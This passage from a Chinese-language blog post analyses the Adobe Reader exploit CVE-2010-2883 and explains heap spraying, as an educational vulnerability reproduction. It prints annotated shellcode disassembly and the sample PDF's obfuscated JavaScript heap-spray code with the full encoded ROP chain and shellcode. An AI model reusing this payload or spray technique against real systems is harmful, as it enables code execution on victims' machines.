F6                jne         0103006A</span><br><span class="line">// </span><br><span class="line">01030074 03 7D F8             add         edi,dword ptr [ebp-8]</span><br><span class="line">01030077 3B 7D 24             cmp         edi,dword ptr [ebp+24h]       //比较hash</span><br><span class="line">0103007A 75 E4                jne         01030060                      //如果比较不成功，则比较下一个</span><br><span class="line">0103007C 58                   pop         eax                           //eax = 导出表地址</span><br><span class="line">0103007D 8B 58 24             mov         ebx,dword ptr [eax+24h]       //导出序号表RVA </span><br><span class="line">01030080 01 D3                add         ebx,edx                       //拿到导出序号表</span><br><span class="line">01030082 66 8B 0C 4B          mov         cx,word ptr [ebx+ecx*2]       //拿到函数序号</span><br><span class="line">01030086 8B 58 1C             mov         ebx,dword ptr [eax+1Ch]       //拿到函数地址表RVA</span><br><span class="line">01030089 01 D3                add         ebx,edx                       //拿到函数地址表</span><br><span class="line">0103008B 8B 04 8B             mov         eax,dword ptr [ebx+ecx*4]     //从函数地址表中获取函数RVA</span><br><span class="line">0103008E 01 D0                add         eax,edx                       //获取函数地址</span><br><span class="line">01030090 89 44 24 24          mov         dword ptr [esp+24h],eax  </span><br><span class="line">01030094 5B                   pop         ebx  </span><br><span class="line">01030095 5B                   pop         ebx  </span><br><span class="line">01030096 61                   popad  </span><br><span class="line">01030097 59                   pop         ecx  </span><br><span class="line">01030098 5A                   pop         edx  </span><br><span class="line">01030099 51                   push        ecx  </span><br><span class="line">0103009A FF E0                jmp         eax  </span><br><span class="line">0103009C 5F                   pop         edi  </span><br><span class="line">0103009D 5F                   pop         edi  </span><br><span class="line">0103009E 5A                   pop         edx  </span><br><span class="line">0103009F 8B 12                mov         edx,dword ptr [edx]  </span><br><span class="line">010300A1 EB 8D                jmp         01030030  </span><br><span class="line"></span><br><span class="line">//ShellCode起始地址</span><br><span class="line">010300A3 5D                   pop         ebp  </span><br><span class="line">010300A4 6A 01                push        1</span><br><span class="line">010300A6 8D 85 B2 00 00 00    lea         eax,[ebp+0B2h]     //eax = 0x010300D3</span><br><span class="line">010300AC 50                   push        eax</span><br><span class="line">010300AD 68 31 8B 6F 87       push        876F8B31h          //WinExec</span><br><span class="line">010300B2 FF D5                call        ebp                //call 01030021</span><br><span class="line"></span><br><span class="line">010300B4 BB F0 B5 A2 56       mov         ebx,56A2B5F0h  </span><br><span class="line">010300B9 68 A6 95 BD 9D       push        9DBD95A6h  </span><br><span class="line">010300BE FF D5                call        ebp                //GetVersion</span><br><span class="line">010300C0 3C 06                cmp         al,6  </span><br><span class="line">010300C2 7C 0A                jl          010300CE  </span><br><span class="line">010300C4 80 FB E0             cmp         bl,0E0h  </span><br><span class="line">010300C7 75 05                jne         010300CE  </span><br><span class="line">010300C9 BB 47 13 72 6F       mov         ebx,6F721347h  </span><br><span class="line">010300CE 6A 00                push        0  </span><br><span class="line">010300D0 53                   push        ebx  </span><br><span class="line">010300D1 FF D5                call        ebp               //ExitProcess</span><br><span class="line">010300D3 63 61 6C             arpl        word ptr [ecx+6Ch],sp  </span><br><span class="line">010300D6 63 2E                arpl        word ptr [esi],bp  </span><br><span class="line">010300D8 65 78 65             js          01030140</span><br></pre></td></tr></table></figure></div>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们这里来总结一下该漏洞利用：</p>
<ol>
<li>通过栈溢出，结合ROP指令，将程序劫持到<code>0xC0C0C0C0</code>，这里已经通过堆喷布置好了payload</li>
<li>通过<code>CreateFileW</code>创建iso88591文件</li>
<li>通过<code>CreateFileMappingA</code>创建文件映射</li>
<li>通过<code>MapViewOfFile</code>拿到内存中的地址，这一步完成之后，内存中可执行的内存已经创建出来了，这也就是我们说的绕过DEP</li>
<li>通过<code>memcmp</code>函数将ShellCode复制到该内存中</li>
<li>解密，执行</li>
</ol>
<h1 id="Heap-Spary技术"><a href="#Heap-Spary技术" class="headerlink" title="Heap Spary技术"></a>Heap Spary技术</h1><p>我们已经通过调试，知道了劫持程序执行流之后，会跳转到<code>0xC0C0C0</code>地址去执行payload，那为什么这里有我们的payload呢？<br>实际上，这里利用了一种叫做<code>Heap Spary</code>技术，将<code>0xC0C0C0C0</code>内存布置上我们的payload。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Heap Spray并没有一个官方的正式定义，毕竟这是漏洞攻击技术的一部分。但是我们可以根据它的特点自己来简单总结一下。Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。<br>传统slide code（滑板指令）一般是NOP指令，但是随着一些新的攻击技术的出现，逐渐开始使用更多的类NOP指令，譬如0x0C（0x0C0C代表的x86指令是OR AL 0x0C），0x0D等等，不管是NOP还是0C，他们的共同特点就是不会影响shellcode的执行。<br>当申请大量的内存到时候，堆很有可能覆盖到的地址是0x0A0A0A0A（160M），0x0C0C0C0C（192M），0x0D0D0D0D（208M）等等几个地址(只是可能，只不过在大多数情况下，堆的内存空间是很低的，所以大多数情况下是有可能的)。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250711175623.png"
                      alt="20250711175623"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250711175627.png"
                      alt="20250711175627"
                ><br>现在我们知道了如何将类如<code>0x0C0C0C0C</code>的地址覆写，接下来我们看一下关于滑板指令的选取和布置问题：<br>简单来说，为什么要在shellcode前面加slidecode呢？直接全用shellcode不是更容易执行吗？<br>其实道理很简单：要让shellcode成功运行，必须精准命中它的第一条指令。如果整个内存都填满shellcode，反而很难命中（概率几乎为零）。加上slidecode后，只要命中slidecode就能保证shellcode执行成功。<br>举个例子：</p>
<ul>
<li>shellcode通常约50字节</li>
<li>slidecode约100万字节（按1MB计算）<br>  这样命中概率就高达99.99%了<br>但要注意：</li>
</ul>
<ol>
<li>slidecode的执行不能影响shellcode</li>
<li>以前常用NOP指令（0x90）填充，比如把函数指针改成0x0C0C0C0C</li>
<li>现在为了绕过系统保护，更多是攻击虚函数指针（多级指针），这时slidecode的选择就很重要了<br>关键点：<br>如果用0x90做slidecode，但用0x0C0C0C0C覆盖虚函数指针，程序会跑到0x90909090（内核空间）导致崩溃。所以正确的做法是：slidecode也使用0x0C0C0C0C。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250711180008.png"
                      alt="20250711180008"
                ></li>
</ol>
<h2 id="样本中的利用"><a href="#样本中的利用" class="headerlink" title="样本中的利用"></a>样本中的利用</h2><p>我们现在知道了如何去执行payload，但是现在还有一个问题，就是我们要在栈溢出，也就是我们劫持程序执行流之前就要完成堆喷，那么这里又是如何完成的呢？？？<br>实际上，如果我们去找一下样本PDF中的对象，就会发现这样一段代码：</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">UdhOEvCxYfMjdcykVDRXmZibbUqbGGJtBwzJwjmhMAsUCVWSXXUtSJkpoAihGIiPbjePBWxGdshFSVeZBvVZaYgrIJhZfsqqjf</span> = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">RuwJFbqPzyLINqKkjnFlFpYXXbzpWTQrsPnTHLATwmStlCacfbQs</span> = <span class="title class_">UdhOEvCxYfMjdcykVDRXmZibbUqbGGJtBwzJwjmhMAsUCVWSXXUtSJkpoAihGIiPbjePBWxGdshFSVeZBvVZaYgrIJhZfsqqjf</span>( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ucfda%u72bb%u8a93%ud9fd%u2474%u58f4%uc929%u31b1%u5831%u0318%u1858%uc083%u7176%u017f%uf79e%ufa80%u985e%u1f09%u986f%u6b6e%u28df%u39e4%uc3d3%ua9a8%ua160%udd64%u0cc1%ud053%u3dd2%u73a7%u3c50%u53f4%u8f69%u9509%uf2ae%uc7e0%u7867%uf856%u340c%u736b%ud85e%u60eb%udb16%u36da%u822d%ub9fc%ubee2%ua1b4%ufbe7%u590f%u70d3%u8b8e%u782a%uf23d%u8b83%u323f%u7423%u4a4a%u0950%u894d%ud52b%u0ad8%u9e8b%uf77b%u722a%u7c1d%u3f20%uda69%ube24%u50be%u4b50%ub741%u0fd1%u1366%ud4ba%u0207%uba66%u5438%u63c9%u1e9d%u70e7%u7cac%u866d%ufb22%u88c3%u043c%ue173%u8f0d%u761c%u5a92%u8859%uc7d8%u01cb%u9d85%u4c4e%u4836%u698c%u79b5%u8e6c%u0ba5%uca69%ue761%u4303%u0704%u64b0%u640d%uf757%u45cd%u7ff2%u9a77&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span> = <span class="title class_">UdhOEvCxYfMjdcykVDRXmZibbUqbGGJtBwzJwjmhMAsUCVWSXXUtSJkpoAihGIiPbjePBWxGdshFSVeZBvVZaYgrIJhZfsqqjf</span>( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="keyword">while</span> (<span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>+=<span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>;</span><br><span class="line">nwyVkBGWjTdNgPvAdXnouEREIY = <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line">nwyVkBGWjTdNgPvAdXnouEREIY += <span class="title class_">RuwJFbqPzyLINqKkjnFlFpYXXbzpWTQrsPnTHLATwmStlCacfbQs</span>;</span><br><span class="line">nwyVkBGWjTdNgPvAdXnouEREIY += <span class="title class_">TRHxcHIWAIhbxIDviAAaGSFgPtOMKJYZkRgFrqqdGjpJEkTYZqeDkVJeOCpulrbcKVjdaclvUOMniZEdIbDbWaubquSAQb</span>;</span><br><span class="line"><span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span> = nwyVkBGWjTdNgPvAdXnouEREIY.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span>.<span class="property">length</span> &lt; <span class="number">0x80000</span>) <span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span> += <span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span>;</span><br><span class="line">yCoMcbAoUUJKDGjtJdFHKVarhqRCCSDijQaImQNAKLUbXOSmWvplTduqUhdIoXcak = <span class="title class_">AtwXNXJOzscSuNNFbIYdHBKBzuzLFaPcczegYSuZcygpEGdPlznBvFWxUgdDRAkxlBgqWoWTRi</span>.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CzLzwBYCuqCToWKkYDlAQiILHJjaTcumAQQrPISncRvzrjIXvckDydUQUSDYimBDbrTyjTlwhT</span> = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>=<span class="number">0</span>;<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>&lt;<span class="number">0x1f0</span>;<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>++) <span class="title class_">CzLzwBYCuqCToWKkYDlAQiILHJjaTcumAQQrPISncRvzrjIXvckDydUQUSDYimBDbrTyjTlwhT</span>[<span class="title class_">LMQWIowdWtOoMkKwLOfujctvQYDqtloeBFXwdVvvbhsmmROVFXjWXhXHXJqRlBTtmNfgORlzpmpMxlounDQVzZbvNEWqyjx</span>]=yCoMcbAoUUJKDGjtJdFHKVarhqRCCSDijQaImQNAKLUbXOSmWvplTduqUhdIoXcak+<span class="string">&quot;s&quot;</span>;</span><br></pre></td></tr></table></figure></div>
<p>这段代码是经过混淆的，实际上，PDF是能够执行JavaScript代码的，所以在我们栈溢出之前，堆喷已经完成了。</p>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>经过对该漏洞的复现，发现其实漏洞原理较漏洞利用还是比较简单，这里主要就是对于该漏洞的利用，要构造ROP链，利用堆喷技术跳转到ROP链上执行，然后就是对于ROP链中各个ROP指令的选择，这里为了绕过DEP，实际上利用了一种方法：利用未开启DEP的模块去绕过。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link"   target="_blank" rel="noopener" href="https://sp4n9x.github.io/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/#" >CVE-2010-2883复现与分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/218543#h2-13" >初学CVE-2010-2883漏洞调试及复现<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/magictong/article/details/7391397" >Heap Spray原理浅析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 【漏洞复现】CVE-2010-2883漏洞复现</li>
        <li><strong>Author:</strong> Shad0hun</li>
        <li><strong>Created at
                :</strong> 2025-07-11 18:16:28</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-07-16 12:17:38
            </li>
        
        <li>
            <strong>Link:</strong> https://shad0hun.github.io/2025/07/11/漏洞复现/【漏洞复现】CVE-2010-2883漏洞复现/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/07/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2010-3333%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">【漏洞复现】CVE-2010-3333漏洞复现</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/06/22/%E5%AD%A6%E4%B9%A0/%E3%80%90CTF%E3%80%912025%E7%94%98%E8%82%83%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">【CTF】2025甘肃省网络安全实战演练</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            


        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">【漏洞复现】CVE-2010-2883漏洞复现</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83"><span class="nav-text">分析环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="nav-text">弹出计算机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PDF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="nav-text">PDF文件格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SING%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="nav-text">SING表结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="nav-text">漏洞触发流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-text">漏洞点分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-text">动态调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">漏洞利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81%E5%88%86%E6%9E%90"><span class="nav-text">劫持程序执行流分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">ROP链分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><span class="nav-text">ShellCode执行分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">ShellCode加载器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ShellCode%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="nav-text">ShellCode详细分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Heap-Spary%E6%8A%80%E6%9C%AF"><span class="nav-text">Heap Spary技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B7%E6%9C%AC%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">样本中的利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2025</span>
              -
            
            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Shad0hun</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        21 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="fa-regular fa-arrow-up"></i>
		</li>
		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog "></i>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
